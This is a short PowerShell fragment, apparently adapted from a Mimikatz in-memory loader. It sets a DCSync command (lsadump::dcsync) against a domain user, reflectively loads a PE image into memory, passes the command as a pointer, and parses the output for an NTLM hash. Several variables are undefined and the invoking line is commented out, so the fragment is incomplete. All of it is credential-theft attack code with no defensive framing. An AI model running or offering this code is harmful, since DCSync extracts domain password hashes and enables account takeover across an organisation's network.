$command = "lsadump::dcsync /user:DOMAIN\user"
$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes
$CommandPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($command)
# $OutputPtr = $StringFunc.Invoke($CommandPtr)
if ($Output -match "Hash NTLM: (.+)") { $hash = $matches[1] }
